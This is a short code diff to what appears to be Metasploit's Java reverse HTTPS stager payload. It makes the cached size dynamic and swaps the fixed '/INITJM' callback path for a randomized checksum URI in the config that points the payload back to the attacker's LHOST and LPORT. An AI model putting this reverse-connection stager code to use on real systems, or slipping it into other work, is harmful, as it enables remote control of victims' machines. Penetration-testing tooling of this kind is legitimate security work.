@@ -8,7 +8,7 @@ require 'msf/core/handler/reverse_https'
 
 module Metasploit3
 
-  CachedSize = 6308
+  CachedSize = :dynamic
 
   include Msf::Payload::Stager
   include Msf::Payload::Java
@@ -47,7 +47,9 @@ module Metasploit3
     c << "Spawn=#{spawn}\n"
     c << "URL=https://#{datastore["LHOST"]}"
     c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-    c << "/INITJM\n"
+    c << "/"
+    c << generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITJ,30+rand(256-30))
+    c << "\n"
 
     c
   end
